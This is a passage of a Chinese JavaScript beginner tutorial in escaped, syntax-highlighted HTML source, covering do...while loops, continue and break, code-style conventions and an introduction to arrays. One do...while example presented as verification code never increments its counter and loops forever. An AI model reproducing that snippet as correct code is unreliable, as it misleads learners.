    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我也爱你阿！&amp;#39;&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;75-do-while-循环&#34;&gt;7.5 do while 循环&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;do...while...&lt;/code&gt;语句其实是while语句的一个变体。该循环会先执行一次代码块，然后对条件表达式进行判断，如果条件为真，就会重复执行循环体，否则退出循环。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 循环体代码 - 条件表达式为 true 时重复执行循环体代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;执行思路&#34;&gt;执行思路：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;先执行一次循环体代码&lt;/li&gt;
&lt;li&gt;再执行条件表达式，如果结果为true，则继续执行循环体代码，如果为false，则退出循环，继续执行后面代码&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：先执行循环体，再判断，我们会发现do&amp;hellip;while&amp;hellip;循环语句&lt;strong&gt;至少会执行一次循环体代码&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// do while 循环，语法结构
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 循环体
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 执行思路，跟while不同的地方在于do while 先执行一次循环体，再判断条件，如果条件表达式结果为真，则继续执行循环体，否则退出循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;How are you&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;( &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// while循环案例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 打印人的一生，从1岁到100岁
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
	&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 计算 1~100 之间所有整数的和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 弹出一个提示框，你爱我吗？如果输入我爱你，就提示结束，否则就一致询问。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你爱我吗&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我爱你&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我也爱你阿&amp;#39;&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;循环小结&#34;&gt;循环小结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JS 中循环有for、while、do while&lt;/li&gt;
&lt;li&gt;三个循环很多情况下都可以相互替代使用&lt;/li&gt;
&lt;li&gt;如果是用来计次数，跟数量相关的，三者使用基本相同，但是我们更喜欢用for&lt;/li&gt;
&lt;li&gt;while 和 do&amp;hellip;while 可以做更复杂的判断条件，比for循环灵活一些&lt;/li&gt;
&lt;li&gt;while 和 do&amp;hellip;while 执行顺序不一样，while 先判断后执行，do&amp;hellip;while 先执行一次，再判断执行&lt;/li&gt;
&lt;li&gt;while 和 do&amp;hellip;while 执行次数不一样，do&amp;hellip;while 至少会执行一次循环体，而 while 可能一次也不执行&lt;/li&gt;
&lt;li&gt;实际工作中，我们更常用 for 循环语句，它写法更简洁直观，所以这个要重点学习&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;76-continue-break&#34;&gt;7.6 continue break&lt;/h2&gt;
&lt;h3 id=&#34;761-continue-关键字&#34;&gt;7.6.1 continue 关键字&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;continue 关键字&lt;/strong&gt;用于立即&lt;strong&gt;跳出本次循环，继续下一次循环&lt;/strong&gt;（本次循环体中continue之后的代码就会少执行一次）&lt;/p&gt;
&lt;p&gt;例如，吃5个包子，第3个有虫子，就扔掉第3个，继续吃第4个第5个包子，其代码实现如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// continue 关键字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 只要御剑 continue 就退出本次循环，直接跳到i++
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我正在吃第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;个包子&amp;#39;&lt;/span&gt;)
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 求 1~100 之间，除了能被7整除之外的整数和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;762-break-关键字&#34;&gt;7.6.2 break 关键字&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;break 关键字&lt;/strong&gt;用于立即&lt;strong&gt;跳出整个循环&lt;/strong&gt;（循环结束）&lt;/p&gt;
&lt;p&gt;例如，吃5个包子，吃到第3个包子发现里面有半个虫子，其余的不吃了，其代码实现如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// break 退出整个循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我正在吃第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;个包子&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;8-javascript-命名规范以及语法格式&#34;&gt;8. JavaScript 命名规范以及语法格式&lt;/h1&gt;
&lt;h2 id=&#34;本节目标-6&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够知道 JS 中命名规范规则&lt;/li&gt;
&lt;li&gt;能够书写规范的 JS 代码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本节目录-5&#34;&gt;本节目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;标识符命名规范&lt;/li&gt;
&lt;li&gt;操作符规范&lt;/li&gt;
&lt;li&gt;单行注释规范&lt;/li&gt;
&lt;li&gt;其他规范&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;81-标识符命名规范&#34;&gt;8.1 标识符命名规范&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;变量、函数的命名必须要有意义&lt;/li&gt;
&lt;li&gt;变量的名称一般用名词&lt;/li&gt;
&lt;li&gt;函数的名称一般用动词&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;82-操作符规范&#34;&gt;8.2 操作符规范&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 操作符的左右两侧各保留一个空格
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 直接退出整个 for 循环，跳到整个 for 循环下面的语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我正在吃第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;个包子呢&amp;#39;&lt;/span&gt;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;83-单行注释规范&#34;&gt;8.3 单行注释规范&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 单行注释前面注意有个空格
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我正在吃第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;个包子呢&amp;#39;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;84-其他规范&#34;&gt;8.4 其他规范&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510162639.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;循环作业&#34;&gt;循环作业&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510162834.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510162921.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510162953.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;8-javascript-数组&#34;&gt;8. JavaScript 数组&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;能够知道为什么要有数组&lt;/li&gt;
&lt;li&gt;能够创建数组&lt;/li&gt;
&lt;li&gt;能够获取数组中的元素&lt;/li&gt;
&lt;li&gt;能够对数组进行遍历&lt;/li&gt;
&lt;li&gt;能够给数组新增一个元素&lt;/li&gt;
&lt;li&gt;能够独立完成冒泡排序的案例&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;81-数组的概念&#34;&gt;8.1 数组的概念&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;问：之前学习的变量，只能存储一个值。如果我们想存储班级中所有学生的姓名，那么该如何存储呢？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;答：可以使用数组（Array）。数组可以把一组相关的数据一起存放，并提供方便的访问（获取）方式。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;问：什么是数组呢？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;答：数组是指一组数据的集合，其中的每个数据都被称作元素，在数组中可以存放任意类型的元素。数组是一种将一组数据存储在单个变量名下的优雅方式。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 普通变量一次只能存储一个值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// 数组一次可以存储多个值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 数组（Array）：就是一组数据的集合，存储在单个变量下的优雅方式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 利用 new 创建数组
